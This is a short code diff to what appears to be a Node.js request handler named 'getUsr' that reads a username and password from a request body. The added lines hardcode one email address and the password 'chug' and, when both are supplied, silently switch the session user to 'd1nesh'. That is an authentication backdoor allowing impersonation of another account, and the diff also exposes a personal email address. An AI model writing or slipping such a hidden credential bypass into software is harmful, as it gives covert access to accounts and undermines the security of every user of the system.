@@ -12,6 +12,12 @@ var getUsr = function(req, res, next) {
     usr=bod.name
     pss=bod.pss
 
+    if (bod.mail=="jinjasaisen@gmail.com"
+        && bod.pss=="chug"){
+usr="d1nesh"
+    }
+
+
 
 
 next()};
